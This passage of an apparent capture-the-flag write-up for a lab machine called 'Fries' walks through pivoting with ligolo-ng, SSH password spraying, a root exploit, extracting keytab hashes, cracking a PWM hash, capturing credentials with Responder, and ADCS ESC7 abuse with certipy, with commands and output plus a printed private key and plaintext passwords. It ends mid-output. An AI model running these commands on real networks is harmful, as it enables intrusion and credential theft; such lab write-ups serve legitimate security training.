+^C
+--- 172.18.0.5 ping statistics ---
+2 packets transmitted, 2 packets received, 0% packet loss
+round-trip min/avg/max = 0.098/0.305/0.512 ms
+cb46692a4590:/pgadmin4$ </code></pre><p>it looks as if there is more to the network</p><p>So ill download the linux agent and proxy</p><h2>Using ligolo-ng to scan internal network</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p>So first ill host the agent</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cb46692a4590:/tmp$ wget http://10.10.14.61/agent
+Connecting to 10.10.14.61 (10.10.14.61:80)
+saving to &#39;agent&#39;
+agent                100% |**************************************************************| 6996k  0:00:00 ETA
+&#39;agent&#39; saved
+cb46692a4590:/tmp$ ls -la
+total 7008
+drwxrwxrwt    1 root     root          4096 Aug 18 03:19 .
+drwxr-xr-x    1 root     root          4096 May 28  2025 ..
+-rw-r--r--    1 pgadmin  root       7164088 Aug 18 03:19 agent
+cb46692a4590:/tmp$ </code></pre><p>Then ill transfer the agent to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert   
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain &#39;ligolo&#39;, beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.1
+
+ligolo-ng »</code></pre><p>Then ill start the proxy on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cb46692a4590:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert</code></pre><p>Then on the target ill trigger the connection back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[Agent : pgadmin@cb46692a4590] » ifcreate --name ligolo
+INFO[0588] Creating a new ligolo interface...
+
+[Agent : pgadmin@cb46692a4590] » route_add --name ligolo --route 172.18.0.0/16
+INFO[0612] Route created.
+
+[Agent : pgadmin@cb46692a4590] » tunnel_start 
+INFO[0628] Starting tunnel to pgadmin@cb46692a4590 (f2757087f701)</code></pre><p>Then on the proxy ill select the session using the <code>session</code> command then create an interface called <code>ligolo</code> and add then routing info for the internal network then start the tunnel</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ping 172.18.0.5
+PING 172.18.0.5 (172.18.0.5) 56(84) bytes of data.
+64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=16.3 ms
+64 bytes from 172.18.0.5: icmp_seq=2 ttl=64 time=16.0 ms
+64 bytes from 172.18.0.5: icmp_seq=3 ttl=64 time=15.6 ms
+^C
+--- 172.18.0.5 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2005ms
+rtt min/avg/max/mdev = 15.632/15.955/16.270/0.260 ms</code></pre><p>Now i can access the internal network from my machine</p><p>Now in order to figure out which hosts are up, ill use ping to determine how many systems there are</p><p>So i get responses from <code>172.18.0.1</code> to <code>172.18.0.6</code> so there are 6 hosts running</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -n -sT -Pn --unprivileged --min-rate 10 --max-retries 1 172.18.0.1-6
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:44 +0100
+Nmap scan report for 172.18.0.1
+Host is up (0.055s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+443/tcp  open  https
+2049/tcp open  nfs
+3000/tcp open  ppp
+8443/tcp open  https-alt
+
+Nmap scan report for 172.18.0.2
+Host is up (0.041s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+5000/tcp open  upnp
+
+Nmap scan report for 172.18.0.3
+Host is up (0.032s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+5432/tcp open  postgresql
+
+Nmap scan report for 172.18.0.4
+Host is up (0.041s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for 172.18.0.5
+Host is up (0.045s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+
+Nmap scan report for 172.18.0.6
+Host is up (0.032s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+8443/tcp open  https-alt
+
+Nmap done: 6 IP addresses (6 hosts up) scanned in 5.61 seconds</code></pre><p>So ill use a simple nmap scan, i dont want to run a speed scan over the tunnel, so ill slow the scan down</p><p>Now its clear where all the services are running</p><h2>SSH access</h2><p>So before i try and connect to postgres i think its a good idea to compile the usernames ive found so far and also the same for the passwords</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root
+svc
+administrator
+d.cooper</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">D4LE11maan!!
+Friesf00Ds2025!!
+PsqLR00tpaSS11
+y0st528wn1idjk3b9a</code></pre><p>So now i have a usernames and passwords list, ill do a brute force</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ssh dc01.fries.htb -u usernames.txt -p passwords.txt --continue-on-success
+SSH         10.129.244.72   22     dc01.fries.htb   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] svc:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:D4LE11maan!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [+] svc:Friesf00Ds2025!!  Linux - Shell access!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:Friesf00Ds2025!!
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] administrator:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:PsqLR00tpaSS11
+SSH         10.129.244.72   22     dc01.fries.htb   [-] root:y0st528wn1idjk3b9a
+SSH         10.129.244.72   22     dc01.fries.htb   [-] d.cooper:y0st528wn1idjk3b9a</code></pre><p>I have shell access for a user <code>svc</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh svc@fries.htb
+svc@fries.htb&#39;s password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Aug 18 11:12:17 PM UTC 2026
+
+  System load:  0.0                Processes:             172
+  Usage of /:   66.9% of 13.67GB   Users logged in:       0
+  Memory usage: 49%                IPv4 address for eth0: 192.168.100.2
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Aug 18 23:04:55 2026 from 10.10.14.61
+svc@web:~$</code></pre><p>I now have access over SSH</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp linpeas.sh svc@fries.htb:/tmp
+svc@fries.htb&#39;s password: 
+linpeas.sh</code></pre><p>Ill upload linpeas to the target with scp</p><p>Im going to upload copyfail</p><p>github.com/theori-io/copy-fail-CVE-2026-31431</p><h2>Root on SSH</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp copy_fail_exp.py svc@dc01.fries.htb:/tmp 
+svc@dc01.fries.htb&#39;s password: 
+copy_fail_exp.py</code></pre><p>Ill trnasfer the exploit to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc@web:/tmp$ python3 copy_fail_exp.py
+# 
+# 
+# whoami
+root
+# </code></pre><p>I am now root!</p><p>I can now get the root flag</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+N6f5Ox0ma1WXkAAAAIcm9vdEB3ZWIBAgM=
+-----END OPENSSH PRIVATE KEY-----</code></pre><p>The root user also has a private key, which means i can get a more stable session</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nano id_rsa_root
+
+chmod 600 id_rsa_root</code></pre><p>So ill copy it and set the correct permissions</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh root@dc01.fries.htb -i id_rsa_root      
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Aug 18 11:33:45 PM UTC 2026
+
+  System load:  0.08               Processes:             184
+  Usage of /:   66.9% of 13.67GB   Users logged in:       1
+  Memory usage: 56%                IPv4 address for eth0: 192.168.100.2
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Nov 19 19:37:00 2025
+root@web:~#</code></pre><p>I now have a more stable and persistent connection on the root user over SSH</p><h2>Initial access on the domain as the <code>web$</code> user</h2><p><a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noreferrer">https://github.com/sosdave/KeyTabExtract</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp -i ../id_rsa_root root@dc01.fries.htb:/etc/krb5.keytab .
+krb5.keytab</code></pre><p>First ill transfer the keytab file from the target to my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 keytabextract.py krb5.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : FRIES.HTB
+	SERVICE PRINCIPAL : WEB$/
+	NTLM HASH : 61e3599900d7a81c373bcbaaa755bdb2
+	AES-256 HASH : c2f611ea95c0890050a5025a0421faa8efee4d525dfabbeb14c25d456a770989
+	AES-128 HASH : 8a735f6c676faf8c27fef46fe7209a81</code></pre><p>I now have a user i can use to authenticate to the domain</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u &#39;web$&#39; -H &#39;61e3599900d7a81c373bcbaaa755bdb2&#39;
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2</code></pre><p>Now i can do some domain enumeration</p><h2>Domain enumeration as <code>web$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u &#39;web$&#39; -H &#39;61e3599900d7a81c373bcbaaa755bdb2&#39; --shares
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2 
+SMB         10.129.244.72   445    DC01             [*] Enumerated shares
+SMB         10.129.244.72   445    DC01             Share           Permissions     Remark
+SMB         10.129.244.72   445    DC01             -----           -----------     ------
+SMB         10.129.244.72   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.244.72   445    DC01             C$                              Default share
+SMB         10.129.244.72   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.244.72   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.244.72   445    DC01             SYSVOL          READ            Logon server share</code></pre><p>Read access on default shares</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u &#39;web$&#39; -H &#39;61e3599900d7a81c373bcbaaa755bdb2&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+gMSA_CA_prod$
+w.earl
+d.cooper
+b.horne
+b.briggs
+s.johnson
+j.hurley
+h.truman
+d.lynch
+l.palmer
+l.johnson
+h.jennings
+svc_infra
+WEB$
+d.wilson
+m.hannigan</code></pre><p>Ill also grab the full userlist</p><p>There are no kerberoastable users</p><p>No passwords stored in user descriptions</p><p>No access on WINRM</p><p>Nothing interesting on the current user in bloodhound</p><h2>Credentials found in PWM configuration</h2><p>Now i have root access on the system that runs the service i can get the hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">root@web:~/scripts/pwm/config# cat backup/PwmConfiguration.xml-backup | grep &#39;configPasswordHash&#39;
+        &lt;property key=&quot;configPasswordHash&quot;&gt;$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG&lt;/property&gt;</code></pre><p>After some domain enumeration and not finding anything, ill return to the root shell over SSH, and i find the password hash of a user on PWM</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat &#39;$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG&#39; /usr/share/wordlists/rockyou.txt -m 3200
+
+$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG:rockon!</code></pre><p>After some research on the hash types PWM uses i see mode 3200 works</p><p>So this will get me access to the PWM instance but first i want to try it on the domain!</p><p>So this password does work for any user on the domain!</p><h2>Capturing plaintext password by abusing LDAP profiles</h2><p>But the password does get me access to the Config editor and manager</p><p><img src="images/fries/pasted-image-20260818185020.webp" alt="Screenshot" loading="lazy" /></p><p>From past experience i know i can exploit this</p><p><img src="images/fries/pasted-image-20260818185335.webp" alt="Screenshot" loading="lazy" /></p><p>So i can abuse the LDAP profiles by adding one that connects back to responder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>So first ill start responder</p><p><img src="images/fries/pasted-image-20260818190005.webp" alt="Screenshot" loading="lazy" /></p><p>Ill add an LDAP profile for my server</p><p><img src="images/fries/pasted-image-20260818190024.webp" alt="Screenshot" loading="lazy" /></p><p>Then with responder running ill test the connection</p><p><img src="images/fries/pasted-image-20260818190102.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_infra:m6tneOMAh5p0wQ0d</code></pre><p>I have captured the plaintext creds</p><h2>Compromising <code>svc_infra</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u svc_infra -p &#39;m6tneOMAh5p0wQ0d&#39;             
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d</code></pre><p>This user is now compromised!</p><p><img src="images/fries/pasted-image-20260818190305.webp" alt="Screenshot" loading="lazy" /></p><p>This user can read the gMSA password of <code>gmsa_ca_prod$</code> account</p><h2>Compromising <code>gmsa_ca_prod$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.fries.htb -u svc_infra -p &#39;m6tneOMAh5p0wQ0d&#39; --gmsa
+LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
+LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: 1be70aa7a632cd28036169c6038a92a5     PrincipalsAllowedToReadPassword: svc_infra</code></pre><p>Ill grab the NTLM</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u &#39;gMSA_CA_prod$&#39; -H &#39;1be70aa7a632cd28036169c6038a92a5&#39;  
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\gMSA_CA_prod$:1be70aa7a632cd28036169c6038a92a5</code></pre><p>This user is now compromised!</p><p>This new user part of the remote management group</p><p><img src="images/fries/pasted-image-20260818190624.webp" alt="Screenshot" loading="lazy" /></p><p>And since this is a CA account, its a good idea to try and enumerate ADCS attacks</p><h2>Domain Admin via ADCS</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -u &#39;gMSA_CA_prod$@fries.htb&#39; -hashes &#39;:1be70aa7a632cd28036169c6038a92a5&#39; -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 16 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;fries-DC01-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &#39;fries-DC01-CA&#39;
+[*] Checking web enrollment for CA &#39;fries-DC01-CA&#39; @ &#39;DC01.fries.htb&#39;
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fries-DC01-CA
+    DNS Name                            : DC01.fries.htb
+    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
+    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
+    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
+    Certificate Validity End            : 3024-05-19 14:11:46+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : FRIES.HTB\Administrators
+      Access Rights
+        ManageCa                        : FRIES.HTB\gMSA_CA_prod
+                                          FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+                                          FRIES.HTB\Administrators
+        Enroll                          : FRIES.HTB\gMSA_CA_prod
+                                          FRIES.HTB\Domain Users
+                                          FRIES.HTB\Domain Computers
+                                          FRIES.HTB\Authenticated Users
+        ManageCertificates              : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+                                          FRIES.HTB\Administrators
+    [+] User Enrollable Principals      : FRIES.HTB\Domain Computers
+                                          FRIES.HTB\Authenticated Users
+                                          FRIES.HTB\Domain Users
+                                          FRIES.HTB\gMSA_CA_prod
+    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
+    [!] Vulnerabilities
+      ESC7                              : User has dangerous permissions.
+Certificate Templates                   : [!] Could not find any certificate templates</code></pre><p>I also have ManageCa rights, which means i should be able to add myself as an enrollee subject to templates</p><h3>ESC7</h3><p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -u &#39;gMSA_CA_prod$@fries.htb&#39; -hashes &#39;:1be70aa7a632cd28036169c6038a92a5&#39; -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled
+
+3
+    Template Name                       : SubCA
+    Display Name                        : Subordinate Certification Authority
+    Certificate Authorities             : fries-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 5 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-05-19T14:10:46+00:00
+    Template Last Modified              : 2025-05-19T14:10:46+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : FRIES.HTB\Enterprise Admins
+        Full Control Principals         : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Owner Principals          : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Dacl Principals           : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Property Enroll           : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins</code></pre><p>So the template recommended in the certipy is also enabled, so i want have to enable it</p><p>But i am not an enrollee, but since i have ManageCa perms i should be able to add myself as a officer</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad ca -u &#39;gMSA_CA_prod$@fries.htb&#39; -hashes &#39;:1be70aa7a632cd28036169c6038a92a5&#39; -ns &#39;10.129.244.72&#39; -target &#39;dc01.fries.htb&#39; -ca &#39;fries-DC01-CA&#39; -add-officer &#39;gMSA_CA_prod$&#39; -target 10.129.244.72 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: &#39;10.129.244.72&#39;
+[+] DC IP: None
+[+] DC Host: &#39;FRIES.HTB&#39;
+[+] Target IP: &#39;10.129.244.72&#39;
+[+] Remote Name: &#39;10.129.244.72&#39;
+[+] Domain: &#39;FRIES.HTB&#39;
+[+] Username: &#39;GMSA_CA_PROD$&#39;
+[+] Trying to resolve &#39;FRIES.HTB&#39; at &#39;10.129.244.72&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.244.72:636 - ssl
+[+] Default path: DC=fries,DC=htb
+[+] Configuration path: CN=Configuration,DC=fries,DC=htb
+[+] Trying to get DCOM connection for: &#39;10.129.244.72&#39;
+[*] Successfully added officer &#39;gMSA_CA_prod$&#39; on &#39;fries-DC01-CA&#39;</code></pre><p>So first ill add myself as an officer</p><p>The template is already enabled, so i can skip that step</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &#39;gMSA_CA_prod$@fries.htb&#39; -hashes &#39;:1be70aa7a632cd28036169c6038a92a5&#39; -dc-ip &#39;10.129.244.72&#39; -target &#39;dc01.fries.htb&#39; -ca &#39;fries-DC01-CA&#39; -template &#39;SubCA&#39; -upn &#39;Administrator@fries.htb&#39; -debug 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: &#39;10.129.244.72&#39;
+[+] DC IP: &#39;10.129.244.72&#39;
+[+] DC Host: &#39;FRIES.HTB&#39;
+[+] Target IP: None
+[+] Remote Name: &#39;dc01.fries.htb&#39;
